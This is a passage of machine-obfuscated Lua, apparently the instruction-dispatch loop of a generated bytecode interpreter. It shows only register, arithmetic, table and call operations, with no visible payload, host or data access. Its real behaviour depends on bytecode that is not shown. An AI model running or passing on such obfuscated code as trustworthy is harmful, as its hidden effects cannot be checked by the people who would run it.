A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];d=d+o[3];end;elseif c<=193 then local a;local D;local c;local f;local C;local A;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]]+e[o[5]];d=d+1;o=l[d];A=o[2];C={};f=0;c=A+o[3]-1;for o=A+1,c do f=f+1;C[f]=e[o];end;D={e[A](r(C,1,c-A))};c=A+o[5]-2;f=0;for o=A,c do f=f+1;e[o]=D[f];end;B=c;d=d+1;o=l[d];e[o[2]]=n[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*n[o[5]];d=d+1;o=l[d];A=o[2];c=A+o[3]-2;a={};f=0;for o=A,c do f=f+1;a[f]=e[o];end;do return r(a,1,f)end;d=d+1;o=l[d];d=d+o[3];elseif c==194 then local D;local a;local A;local C;local c;c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];else local C;local c;local f;local a;local A;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];a={};f=0;c=A+o[3]-1;for o=A+1,c do f=f+1;a[f]=e[o];end;C={e[A](r(a,1,c-A))};c=A+o[5]-2;f=0;for o=A,c do f=f+1;e[o]=C[f];end;B=c;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];d=d+o[3];end;elseif c<=200 then if c<=197 then if c==196 then local J;local a;local c;local D;local C;local A;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];d=d+o[3];else local l=o[2];local f={};local d=0;local n=l+o[3]-1;for o=l+1,n do d=d+1;f[d]=e[o];end;local n={e[l](r(f,1,n-l))};local o=l+o[5]-2;d=0;for o=l,o do d=d+1;e[o]=n[d];end;B=o;end;elseif c<=198 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];elseif c==199 then local a;local D;local c;local f;local C;local A;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+n[o[5]];d=d+1;o=l[d];A=o[2];C={};f=0;c=A+o[3]-1;for o=A+1,c do f=f+1;C[f]=e[o];end;D={e[A](r(C,1,c-A))};c=A+o[5]-2;f=0;for o=A,c do f=f+1;e[o]=D[f];end;B=c;d=d+1;o=l[d];e[o[2]]=n[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];A=o[2];c=A+o[3]-2;a={};f=0;for o=A,c do f=f+1;a[f]=e[o];end;do return r(a,1,f)end;d=d+1;o=l[d];d=d+o[3];else local D;local a;local A;local C;local c;c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];end;elseif c<=203 then if c<=201 then local d=o[2];local n=d+o[3]-2;local l={};local o=0;for d=d,n do o=o+1;l[o]=e[d];end;do return r(l,1,o)end;elseif c==202 then local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];else local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do 